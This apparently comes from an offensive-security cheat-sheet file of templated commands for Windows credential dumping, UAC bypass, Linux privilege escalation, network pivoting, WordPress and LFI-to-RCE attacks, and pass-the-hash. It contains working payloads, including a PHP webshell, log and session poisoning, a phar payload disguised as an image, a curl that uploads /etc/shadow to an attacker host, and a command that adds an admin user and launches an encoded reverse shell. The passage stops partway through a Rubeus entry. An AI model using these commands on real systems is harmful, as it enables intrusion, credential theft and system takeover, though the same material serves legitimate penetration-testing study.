# ══ WINDOWS — CREDENTIALS ═══════════════════════════════════════════
[win-credman-vault]
description = "Windows Credential Manager / Vault enumeration + extraction"
lang = "batch"
tags = ["windows", "creds", "credman"]
body = '''
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
REM output format: Target, Type, User, Persistence

REM run saved creds against a target:
runas /savecred /user:{{domain}}\{{user}} cmd

REM vault locations:
REM %UserProfile%\AppData\Local\Microsoft\Vault\
REM %UserProfile%\AppData\Local\Microsoft\Credentials\
REM %UserProfile%\AppData\Roaming\Microsoft\Vault\
REM %ProgramData%\Microsoft\Vault\

REM via mimikatz:
REM privilege::debug
REM vault::cred
'''

[win-uac-bypass-fodhelper]
description = "UAC bypass via fodhelper / computerdefaults registry hijack"
lang = "batch"
tags = ["windows", "privesc", "uac"]
body = '''
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
'''

[win-lazagne]
description = "LaZagne + Windows Search for credential hunting"
lang = "batch"
tags = ["windows", "creds", "lazagne"]
body = '''
start LaZagne.exe all
'''

[win-findstr-creds]
description = "recursive findstr sweep for hardcoded creds/config"
lang = "batch"
tags = ["windows", "creds", "loot"]
body = '''
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1
REM also check: Desktop, VSCode Recents, Favorite Folders, SYSVOL scripts,
REM web.config, unattend.xml, pass.txt/passwords.docx/passwords.xlsx
'''

[win-xfreerdp-mimikatz]
description = "xfreerdp with a shared drive to run mimikatz remotely"
lang = "bash"
tags = ["windows", "rdp", "creds"]
body = '''
xfreerdp /u:{{user}} /p:'{{password}}' /v:{{target}} /drive:share,/home/{{local_user}}/mimikatz
'''

# ══ LINUX — ENUM / PRIVESC EXTRAS ═══════════════════════════════════
[linux-linpeas]
description = "run linPEAS + quick hidden-file/low-hanging-fruit sweep"
lang = "bash"
tags = ["linux", "enum", "privesc"]
body = '''
df -h
cat /etc/fstab | grep -v "#" | column -t
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep {{user}}
find / -type d -name ".*" -ls 2>/dev/null
ls -l /tmp /var/tmp /dev/shm
./linpeas.sh
'''

[linux-gtfobins-check]
description = "cross-reference installed binaries against GTFOBins API"
lang = "bash"
tags = ["linux", "privesc", "gtfobins"]
body = '''
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do
  if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i"; fi
done
'''

[linux-suid-caps]
description = "SUID/SGID binaries + file capabilities enumeration"
lang = "bash"
tags = ["linux", "privesc", "suid", "capabilities"]
body = '''
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -uid 0 -perm -6000 -type f 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
# for cap_dac_override e.g. vim.basic:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
'''

[linux-shared-lib-hijack]
description = "shared-library / RPATH hijacking (non-standard lib load paths)"
lang = "bash"
tags = ["linux", "privesc", "libraries"]
body = '''
ldd {{binary}}                       # dynamically linked libs
readelf -d {{binary}} | grep PATH    # RUNPATH/RPATH — where it loads libs from
'''

[linux-pythonpath-hijack]
description = "PYTHONPATH hijack via a sudo-allowed python script"
lang = "bash"
tags = ["linux", "privesc", "python"]
body = '''
python3 -c 'import sys; print("\n".join(sys.path))'
pip3 show {{module}}
ls -la /usr/lib/python3.8
sudo PYTHONPATH=/tmp/ /usr/bin/python3 {{script}}
# module content: import pty; pty.spawn("/bin/bash")
'''

[linux-polkit]
description = "polkit paths + pkexec/pkaction/pkcheck enumeration"
lang = "bash"
tags = ["linux", "privesc", "polkit"]
body = '''
ls /usr/share/polkit-1/actions /usr/share/polkit-1/rules.d 2>/dev/null
ls /etc/polkit-1/localauthority/50-local.d 2>/dev/null
pkaction                  # display actions
pkcheck                   # check if a process is authorised for an action
pkexec -u root id
'''

[linux-bitlocker-mount]
description = "mount a BitLocker-encrypted drive/image on Linux via dislocker"
lang = "bash"
tags = ["linux", "forensics", "bitlocker"]
body = '''
sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker /media/bitlockermount
sudo losetup -f -P {{image}}.vhd
sudo dislocker /dev/loop0p2 -u{{password}} -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
cd /media/bitlockermount/ && ls -la
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
'''

[linux-filexfer-servers]
description = "quick file-serving options + encrypted upload endpoint"
lang = "bash"
tags = ["linux", "transfer", "server"]
body = '''
python3 -m http.server 80
python3 -m uploadserver 443 --server-certificate ~/server.pem
# generate a self-signed cert first:
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
curl -X POST https://{{lhost}}/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
'''

# ══ PIVOTING / TUNNELING ═════════════════════════════════════════════
[pivot-socat]
description = "socat reverse port redirection through a pivot"
lang = "bash"
tags = ["pivot", "socat"]
body = '''
socat TCP4-LISTEN:{{listen_port}},fork TCP4:{{lhost}}:{{lport}}
# point the payload's callback at this pivot host; set multi/handler to 0.0.0.0
'''

[pivot-msf-autoroute]
description = "Metasploit autoroute — add a route through a Meterpreter session"
lang = "text"
tags = ["pivot", "metasploit", "autoroute"]
body = '''
meterpreter > ipconfig
meterpreter > arp
meterpreter > run autoroute -s {{subnet}} -n 255.255.255.0
meterpreter > run autoroute -p

# preferred (post module):
meterpreter > background
msf > use post/multi/manage/autoroute
msf post(autoroute) > set SESSION {{session}}
msf post(autoroute) > set SUBNET {{subnet}}
msf post(autoroute) > set NETMASK 255.255.255.0
msf post(autoroute) > set CMD add
msf post(autoroute) > run

# manual routing table:
msf > route add {{subnet}}/24 {{session}}
msf > route print
msf > route add 0.0.0.0 0.0.0.0 {{session}}    # route everything via this pivot
'''

[pivot-msf-socks]
description = "Metasploit SOCKS proxy through a route + proxychains"
lang = "text"
tags = ["pivot", "metasploit", "socks"]
body = '''
msf > use auxiliary/server/socks_proxy
msf > set VERSION 5
msf > set SRVHOST 127.0.0.1
msf > set SRVPORT 1080
msf > run -j
msf > jobs

# /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

$ proxychains nmap -sT -Pn -n {{target}}
$ proxychains crackmapexec smb {{subnet}}
# NOTE: proxychains only works with TCP connect scans (-sT); SYN scans fail over SOCKS
'''

[pivot-msf-portfwd]
description = "Metasploit portfwd — forward a single port through a session"
lang = "text"
tags = ["pivot", "metasploit", "portfwd"]
body = '''
meterpreter > portfwd add -l {{local_port}} -p {{remote_port}} -r {{target}}
meterpreter > portfwd list
meterpreter > portfwd delete -l {{local_port}} -p {{remote_port}} -r {{target}}

# reverse forward (target connects back through you):
meterpreter > portfwd add -R -l {{listen_port}} -L {{attacker_ip}} -p {{remote_port}}
'''

[pivot-ssh-tunnel]
description = "SSH local/dynamic (SOCKS)/reverse port forwarding"
lang = "bash"
tags = ["pivot", "ssh"]
body = '''
# local forward
ssh -L {{local_port}}:localhost:{{pivot_port}} {{user}}@{{foothold_ip}}

# dynamic SOCKS proxy
ssh -D 9050 {{user}}@{{foothold_ip}}
# proxychains config -> socks5 127.0.0.1 9050

# reverse port forward
ssh -R {{internal_ip_of_pivot}}:8080:0.0.0.0:8000 {{user}}@{{target}} -vN
'''

[pivot-ligolo-ng]
description = "Ligolo-ng tunnel setup: proxy + Linux/Windows agent"
lang = "bash"
tags = ["pivot", "ligolo-ng"]
body = '''
# attacker
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.1/ligolo-ng_proxy_0.9.1_linux_amd64.tar.gz -O ligolo-ng.tar.gz && tar -xvzf ligolo-ng.tar.gz
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add {{internal_subnet}}/24 dev ligolo
./proxy -selfcert

# agent, Linux target
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_linux_amd64.tar.gz -O ligolo-ng.tar.gz && tar -xvzf ligolo-ng.tar.gz
./agent -connect {{lhost}}:11601 -v -accept-fingerprint {{fingerprint}}

# agent, Windows target
# Invoke-WebRequest -Uri "https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_windows_amd64.zip" -OutFile ligolo-ng.zip
# Expand-Archive -Path ligolo-ng.zip -DestinationPath .
# ./agent.exe -connect {{lhost}}:11601 -v -accept-fingerprint {{fingerprint}}

# in the UI: start tunneling (default creds ligolo:password)
'''

[pivot-chisel]
description = "chisel SOCKS5 tunnel — forward or reverse"
lang = "bash"
tags = ["pivot", "chisel"]
body = '''
git clone https://github.com/jpillora/chisel.git && cd chisel && go build
# static: go build --ldflags '-linkmode external -extldflags "-static"'

# forward mode: server on pivot, client on attacker
./chisel server -v -p 1234 --socks5          # on pivot
./chisel client -v {{pivot_ip}}:1234 socks   # on attacker

# reverse mode (dodges inbound firewall rules on the pivot)
sudo ./chisel server --reverse -v -p 1234 --socks5   # on attacker
./chisel client -v {{attacker_ip}}:1234 R:socks      # on pivot

# proxychains.conf -> socks5 127.0.0.1 1080
'''

[pivot-sshuttle]
description = "sshuttle — transparent VPN-like tunnel through an SSH session"
lang = "bash"
tags = ["pivot", "sshuttle"]
body = '''
sudo apt-get install sshuttle
sudo sshuttle -r {{user}}@{{pivot}} {{target_subnet_cidr}} -v
sudo nmap -v -A -sT -p{{port}} {{target}} -Pn
'''

[pivot-ptunnel-ng]
description = "ICMP tunneling with ptunnel-ng (when only ICMP egress is allowed)"
lang = "bash"
tags = ["pivot", "icmp", "ptunnel"]
body = '''
git clone https://github.com/utoni/ptunnel-ng.git && cd ptunnel-ng
sudo apt install automake autoconf -y
./autogen.sh
# on pivot (reachable from attack host):
sudo ./ptunnel-ng -r{{jump_box_ip}}
# attacker side:
sudo ./ptunnel-ng -p{{jump_box_ip}} -l2222 -r{{jump_box_ip}}
ssh -p2222 -l{{user}} 127.0.0.1
ssh -D 9050 -p2222 -l{{user}} 127.0.0.1
proxychains nmap -sV -sT {{target}} -p{{port}}
'''

[pivot-dnscat2]
description = "dnscat2 — DNS-based C2/tunnel channel (server + Windows PowerShell client)"
lang = "bash"
tags = ["pivot", "dns", "dnscat2"]
body = '''
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server
sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host={{attacker_ip}},port=53,domain={{target_domain}} --no-cache

REM Windows client:
REM git clone https://github.com/lukebaggett/dnscat2-powershell.git
REM Import-Module .\dnscat2.ps1
REM Start-Dnscat2 -DNSserver {{attacker_ip}} -Domain {{target_domain}} -PreSharedSecret {{secret}} -Exec cmd
'''

# ══ WEB APPLICATION ══════════════════════════════════════════════════
[web-hosts-vhost]
description = "add a discovered host/vhost to /etc/hosts"
lang = "bash"
tags = ["web", "recon", "vhost"]
body = '''
sudo sh -c 'echo "{{server_ip}} {{hostname}}" >> /etc/hosts'
'''

[web-ffuf-dirs]
description = "ffuf directory/file brute-force, recursive, and index-page variants"
lang = "bash"
tags = ["web", "ffuf", "fuzzing"]
body = '''
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://{{target}}/FUZZ -t 200

# recursive
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://{{target}}/FUZZ -recursion -recursion-depth 1 -e .php -v

# extension/index-page guessing
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://{{target}}/{{dir}}/indexFUZZ
'''

[web-ffuf-vhost]
description = "ffuf vhost + subdomain fuzzing"
lang = "bash"
tags = ["web", "ffuf", "vhost", "subdomains"]
body = '''
# subdomains
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.{{domain}}/

# vhosts — remember to add the base vhost to /etc/hosts first
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://{{domain}}:{{port}}/ -H 'Host: FUZZ.{{domain}}' -fs {{baseline_size}}

# alt tool
gobuster vhost -u http://{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain --domain {{domain}}
'''

[web-ffuf-params]
description = "ffuf GET/POST parameter discovery and value fuzzing"
lang = "bash"
tags = ["web", "ffuf", "params"]
body = '''
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://{{target}}/admin.php?FUZZ=key -fs {{baseline_size}}

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://{{target}}/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs {{baseline_size}}

# value fuzzing on a known param (e.g. numeric id)
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://{{target}}/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs {{baseline_size}}
'''

[web-nikto]
description = "nikto vhost-aware scan"
lang = "bash"
tags = ["web", "nikto", "scanning"]
body = '''
nikto -h {{domain}} -Tuning b --vhost {{vhost}}
'''

[web-wafw00f]
description = "detect a WAF in front of the target"
lang = "bash"
tags = ["web", "waf", "recon"]
body = '''
pip3 install git+https://github.com/EnableSecurity/wafw00f
wafw00f {{domain}}
'''

[web-crawl-common-paths]
description = "common disclosure/config paths to check during crawling"
lang = "text"
tags = ["web", "recon", "crawling"]
body = '''
/security.txt                  where to report vulns
/.well-known/change-password
openid-configuration           openid identity layer, endpoint info
assetlinks.json                verifies ownership of digital assets
mta-sts.txt                    email security
robots.txt / sitemap / .git/ / backup files / comments in source
'''

[web-wpscan]
description = "WPScan: enumeration, vuln checks, and password attacks"
lang = "bash"
tags = ["web", "wordpress", "wpscan"]
body = '''
wpscan --url https://{{target}}
wpscan --url https://{{target}} --enumerate ap,at,cb,dbe   # plugins/themes/config-backups/db-exports
wpscan --url https://{{target}} --enumerate u              # usernames only
wpscan --url https://{{target}} --enumerate vp              # vulnerable plugins
wpscan --url https://{{target}} --api-token {{token}}       # WPVulnDB data
wpscan --url https://{{target}} --usernames {{user}} --passwords rockyou.txt
wpscan --url https://{{target}} --random-user-agent
wpscan --url https://{{target}} --enumerate ap,at,tt,cb,dbe,u --api-token {{token}} -o report.txt
'''

[web-wp-version-manual]
description = "manually fingerprint WordPress version/plugins/themes from source"
lang = "bash"
tags = ["web", "wordpress", "fingerprint"]
body = '''
curl -s -X GET http://{{target}} | grep '<meta name "generator"'
curl -s -X GET http://{{target}} | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
curl -s -X GET http://{{target}} | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
curl -s -I http://{{target}}/?author=1        # 404 vs 301 leaks valid user IDs
curl http://{{target}}/wp-json/wp/v2/users | jq
'''

[web-wp-xmlrpc]
description = "WordPress xmlrpc.php login check / method listing / brute-force"
lang = "bash"
tags = ["web", "wordpress", "xmlrpc"]
body = '''
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{{user}}</value></param><param><value>{{password}}</value></param></params></methodCall>" http://{{target}}/xmlrpc.php

curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params><param><value>{{user}}</value></param><param><value>{{password}}</value></param></params></methodCall>" http://{{target}}/xmlrpc.php

wpscan --password-attack xmlrpc -t 20 -U {{user}} -P passwords.txt --url http://{{target}}
'''

[web-wp-theme-editor-shell]
description = "RCE via WordPress theme editor on an INACTIVE theme's 404.php"
lang = "php"
tags = ["web", "wordpress", "rce", "webshell"]
body = '''
<?php system($_GET['cmd']); ?>
'''

[web-wp-known-plugin-lfi]
description = "known-vulnerable plugin LFI example (mail-masta) — pattern for plugin-specific pulls"
lang = "bash"
tags = ["web", "wordpress", "lfi"]
body = '''
curl "http://{{target}}/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
'''

[web-fuzz-general]
description = "wfuzz login/parameter fuzzing with response filtering"
lang = "bash"
tags = ["web", "wfuzz", "fuzzing"]
body = '''
wfuzz -c -z file,wordlist.txt --hc 404 https://{{target}}/FUZZ
wfuzz -c -z file,users.txt -z file,passwords.txt -d "user=FUZZ&pass=FUZ2Z" https://{{target}}/login
wfuzz -c -z file,wordlist.txt --hc 404,403 https://{{target}}/FUZZ   # hide codes
wfuzz -c -z file,wordlist.txt --sc 200,302 https://{{target}}/FUZZ   # show only these codes
'''

[web-file-upload-bypass]
description = "bypass file-type restrictions on upload forms via Burp interception"
lang = "text"
tags = ["web", "upload", "bypass"]
body = '''
Intercept the upload request in Burp/ZAP and change:
  Content-Type: application/x-php   ->   Content-Type: image/gif
(also worth trying: double extensions, null-byte tricks, magic-byte prepending)
'''

[web-webshell-frameworks]
description = "pointers to common webshell collections bundled on HTB boxes"
lang = "text"
tags = ["web", "webshell", "reference"]
body = '''
Laudanum   — on HTB Parrot/Kali at /usr/share/laudanum/
Ninshang   — reverse-shell / webshell framework, check GitHub
'''

# ══ WEB — COMMAND INJECTION ══════════════════════════════════════════
[web-cmdinj-operators]
description = "command injection operators reference (separators + per-injection-type char sets)"
lang = "text"
tags = ["web", "command-injection", "reference"]
body = '''
Separator   Char   URL-enc   Executes
Semicolon   ;      %3b       both
New line    \n     %0a       both
Background  &      %26       both (second output usually shown first)
Pipe        \|     %7c       both (only second output shown)
AND         &&     %26%26    both (only if first succeeds)
OR          \|\|   %7c%7c    second only (if first fails)
Sub-shell   ``     %60%60    both, Linux-only
Sub-shell   $()    %24%28%29 both, Linux-only

Injection type              Operators
SQL Injection                ' , ; -- /* */
Command Injection            ; &&
LDAP Injection                * ( ) & \|
XPath Injection               ' or and not substring concat count
OS Command Injection          ; & \|
Code Injection                 ' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal           ../ ..\\ %00
Object Injection               ; & \|
XQuery Injection               ' ; -- /* */
Shellcode Injection            \x \u %u %n
Header Injection               \n \r\n \t %0d %0a %09
'''

[web-cmdinj-evasion]
description = "command injection filter evasion: spaces, slashes, case, reversing"
lang = "bash"
tags = ["web", "command-injection", "evasion"]
body = '''
# spaces
%0a%09                       # tab
%0a${IFS}                    # IFS value
%0a{ls,-la}                  # bash brace expansion
# Windows cmd: %HOMEPATH:~6,-11%   (env substring trick)
# PowerShell:  $env:HOMEPATH[0]

# slashes/semicolons via env var manipulation / character shifting
${PATH:0:1}
${LS_COLORS:10:1}
$(tr '!-}' '"-~'<<<[)

# command filters commonly weaved around
# ' and " weave on Linux + Windows
# $a and \ weave on Linux only
# ^ weaves on Windows only

# case manipulation (Windows shell is case-insensitive; Linux generally sensitive)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(a="WhOaMi";printf %s "${a,,}")

# reversing
$(rev<<<'imaohw')
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"

# evasion payload libraries
# PayloadsAllTheThings, DOSfuscation, bashfuscator
'''

[web-cmdinj-encoding]
description = "base64 / UTF-16 command encoding for bash and PowerShell"
lang = "bash"
tags = ["web", "command-injection", "encoding"]
body = '''
# bash
echo -n '{{command}}' | base64
bash<<<$(base64 -d<<<{{b64_command}})

# PowerShell (UTF-16LE encoded command, like -EncodedCommand expects)
echo -n '{{command}}' | iconv -f utf-8 -t utf-16le | base64
'''

# ══ WEB — FILE INCLUSION / LFI / RFI ═════════════════════════════════
[web-lfi-basics]
description = "LFI/RFI basics and the path to RCE via upload+include"
lang = "text"
tags = ["web", "lfi", "rfi"]
body = '''
- first confirm the LFI, then check for RFI
- remember Second-Order LFI (file written now, included later)
- if the app has an image/file upload AND the LFI executes included content
  regardless of file extension, mask a PHP shell as e.g. a .gif and include it via LFI
- get the file's written path, then hit it through the LFI parameter
- hide payloads via the zip:// or phar:// PHP wrappers (see web-lfi-wrappers)
'''

[web-lfi-wrappers]
description = "PHP wrapper cheatsheet for LFI -> RCE (filter/data/input/expect)"
lang = "bash"
tags = ["web", "lfi", "php-wrappers", "rce"]
body = '''
# leak source/config as base64 (works even without allow_url_include)
curl "http://{{target}}/index.php?language=php://filter/read=convert.base64-encode/resource={{path}}"
# e.g. leak php.ini to check allow_url_include / allow_url_fopen:
curl "http://{{target}}/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# data:// wrapper (needs allow_url_include) — inline PHP payload as base64
echo '<?php system($_GET["cmd"]); ?>' | base64
curl "http://{{target}}/index.php?language=data://text/plain;base64,{{b64_payload}}&cmd=id"

# php://input — POST body becomes the included code (function must accept $_REQUEST, not just $_POST)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://{{target}}/index.php?language=php://input&cmd=id"

# expect:// (rare, needs the expect extension)
curl -s "http://{{target}}/index.php?language=expect://id"

# ftp-based RFI (first check the LFI, then try remote inclusion)
curl 'http://{{target}}/index.php?language=ftp://{{user}}:{{password}}@{{lhost}}/shell.php&cmd=id'
'''

[web-lfi-phar]
description = "hide a PHP payload inside a phar archive disguised as an image"
lang = "bash"
tags = ["web", "lfi", "phar", "upload"]
body = '''
cat > shell.php << 'EOF'
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
EOF
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# upload shell.jpg, then trigger with the phar:// wrapper via the LFI
'''

[web-lfi-session-poison]
description = "PHP session poisoning via PHPSESSID for LFI -> RCE"
lang = "text"
tags = ["web", "lfi", "session-poisoning"]
body = '''
Session files: /var/lib/php/sessions/ (Linux) or C:\Windows\Temp\ prefixed sess_ (Windows)
1. Note your PHPSESSID cookie
2. Set a page/field value that gets stored server-side in the session (e.g. a "language" or "theme" param)
3. Set that value to an encoded webshell payload
4. Include the session file via LFI: /var/lib/php/sessions/sess_<PHPSESSID>
Note: invoking another shell needs re-poisoning the session first.
'''

[web-lfi-log-poison]
description = "Apache/service log poisoning for LFI -> RCE"
lang = "bash"
tags = ["web", "lfi", "log-poisoning"]
body = '''
# fuzz for the log path, e.g. /var/log/apache2/access.log
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://{{target}}:{{port}}/index.php" -H @Poison
# then trigger via the LFI include of the log path, e.g.:
# ?language=/var/log/apache2/access.log&cmd=id

# other candidate log locations if you lack read access to server logs
# (may need privileged users):
#   /proc/self/environ
#   /proc/self/fd/<PID>
#   /var/log/sshd.log
#   /var/log/mail
#   /var/log/vsftpd.log
#   /etc/apache2/envvars
'''

[web-lfi-old-php-bypass]
description = "legacy PHP LFI forced-extension / null-byte bypass tricks"
lang = "text"
tags = ["web", "lfi", "legacy"]
body = '''
- exploit non-recursive string replacement in the include path
- encoding tricks (see Command Injection > Evasion)
- old PHP versions truncate paths at 4096 chars: start from a non-existent
  directory, backtrack, and append "\." ~2048 times to defeat an appended extension
- null-byte injection: %00 (very old PHP only)
'''

# ══ WEB — FILE UPLOAD ═════════════════════════════════════════════════
[web-upload-clientside-bypass]
description = "bypassing client-side upload validation"
lang = "text"
tags = ["web", "upload", "bypass"]
body = '''
Option 1: intercept and modify the upload request directly (backend variables,
  optionally the Content-Type header) — request capture in Burp/ZAP.
Option 2: modify the front-end JS/HTML to disable the validation before it fires.
'''

[web-upload-serverside-blacklist]
description = "bypassing server-side extension blacklists"
lang = "text"
tags = ["web", "upload", "bypass"]
body = '''
- on Windows servers, extension checks are often case-insensitive — try .pHp, .PHP5
- fuzz extensions against a wordlist (web-ffuf-dirs style) to find what the blacklist misses
- exploit non-comprehensive blacklists, e.g. .phtml, .pht, .phar when .php is blocked
- combine with the Content-Type swap from web-file-upload-bypass (application/x-php -> image/gif)
'''

# ══ CREDENTIAL ACCESS & LATERAL MOVEMENT ═════════════════════════════
[cred-netexec-bruteforce]
description = "NetExec credential brute-force against a single target"
lang = "bash"
tags = ["creds", "netexec", "bruteforce"]
body = '''
sudo apt-get -y install netexec
netexec {{proto}} {{target}} -u {{user_or_userlist}} -p {{password_or_passwordlist}}
netexec winrm {{target}} -u user.list -p password.list
'''

[cred-netexec-spray]
description = "NetExec password spray across a range with a single fixed password"
lang = "bash"
tags = ["creds", "netexec", "spray"]
body = '''
netexec {{proto}} {{target}}/{{range}} -u {{user_or_userlist}} -p '{{fixed_password}}'
netexec winrm {{subnet}}/24 -u user.list -p 'changeme123!'
'''

[cred-evilwinrm-login]
description = "evil-winrm login with password or NTLM hash"
lang = "bash"
tags = ["creds", "winrm", "evil-winrm"]
body = '''
sudo gem install evil-winrm
evil-winrm -i {{target_ip}} -u {{username}} -p {{password}}
evil-winrm -i {{target_ip}} -u {{username}} -H {{ntlm_hash}}
'''

[cred-hydra-services]
description = "Hydra brute-force against common network services + HTTP forms"
lang = "bash"
tags = ["creds", "hydra", "bruteforce"]
body = '''
hydra -L user.list -P password.list ssh://{{target}}
hydra -L user.list -P password.list rdp://{{target}}
hydra -L user.list -P password.list smb://{{target}}
# outdated THC hydra may error on SMBv3 — note it and move to netexec

## HTTP form
hydra -l {{user}} -P password.list {{target}} http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

# RDP with a char-range brute (no wordlist)
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 {{target}} rdp
'''

[cred-msf-smb-login]
description = "Metasploit smb_login brute-force scanner"
lang = "text"
tags = ["creds", "metasploit", "smb"]
body = '''
use auxiliary/scanner/smb/smb_login
set user_file user.list
set pass_file password.list
run
'''

[cred-domain-join-linux]
description = "join a Linux attack box to the target domain for Kerberos auth"
lang = "bash"
tags = ["creds", "kerberos", "domain-join"]
body = '''
echo "{{dc_ip}} {{dc_fqdn}} {{dc_short}}" | sudo tee -a /etc/hosts

sudo tee /etc/krb5.conf << 'EOF'
[libdefaults]
    default_realm = {{REALM}}
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    {{REALM}} = {
        kdc = {{dc_fqdn}}
        admin_server = {{dc_fqdn}}
    }

[domain_realm]
    .{{domain_lower}} = {{REALM}}
    {{domain_lower}} = {{REALM}}
EOF

export KRB5CCNAME=/tmp/{{user}}.ccache
evil-winrm -i {{dc_fqdn}} -r {{domain_lower}}
'''

[cred-pth-windows-mimikatz]
description = "Pass-the-Hash from Windows via mimikatz / Invoke-TheHash"
lang = "powershell"
tags = ["creds", "pth", "mimikatz", "windows"]
body = '''
mimikatz.exe privilege::debug "sekurlsa::pth /user:{{user}} /rc4:{{ntlm}} /domain:{{domain}} /run:cmd.exe"

cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target {{target_ip}} -Domain {{domain}} -Username {{user}} -Hash {{ntlm}} -Command "net user {{newuser}} {{newpassword}} /add && net localgroup administrators {{newuser}} /add" -Verbose
Invoke-WMIExec -Target {{target}} -Domain {{domain}} -Username {{user}} -Hash {{ntlm}} -Command "powershell -e {{b64_reverse_shell}}"
'''

[cred-pth-linux]
description = "Pass-the-Hash from Linux (impacket / netexec / evil-winrm)"
lang = "bash"
tags = ["creds", "pth", "linux"]
body = '''
impacket-psexec {{user}}@{{target}} -hashes :{{ntlm}}
impacket-wmiexec {{user}}@{{target}} -hashes :{{ntlm}}
impacket-atexec {{user}}@{{target}} -hashes :{{ntlm}}
impacket-smbexec {{user}}@{{target}} -hashes :{{ntlm}}

# netexec (only works without LAPS)
nxc smb {{subnet}}/24 -u {{user}} -d . -H {{ntlm}} --local-auth
nxc smb {{subnet}}/24 -u {{user}} -d . -H {{ntlm}} --local-auth -x {{command}}

evil-winrm -i {{target}} -u {{user}} -H {{ntlm}}
'''

[cred-pth-rdp]
description = "RDP via Pass-the-Hash using Restricted Admin Mode"
lang = "bash"
tags = ["creds", "pth", "rdp"]
body = '''
# target-side: enable Restricted Admin Mode (disabled by default)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp /v:{{target}} /u:{{user}} /pth:{{ntlm}}
# NOTE: LocalAccountTokenFilterPolicy=0 in the registry means only RID-500
# "Administrator" can do remote admin unless FilterAdministratorToken is set.
'''

[cred-ptt-mimikatz]
description = "Pass-the-Ticket from Windows via mimikatz (export + inject)"
lang = "text"
tags = ["creds", "ptt", "kerberos", "mimikatz"]
body = '''
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
kerberos::ptt "{{ticket_file}}.kirbi"
misc::cmd

# naming: tickets ending in $ are a computer account; @ separates service and
# domain; "krbtgt" in the name indicates a TGT rather than a service ticket.
# Needs local administrator rights.
'''

[cred-ptt-rubeus]
description = "Pass-the-Ticket / ticket requests via Rubeus"
lang = "text"
tags = ["creds", "ptt", "kerberos", "rubeus"]
body = '''
Rubeus.exe dump /nowrap
Rubeus.exe dump /user:{{user}} /service:krbtgt /nowrap

# get a TGT with an RC4 hash and inject it directly into the current logon session
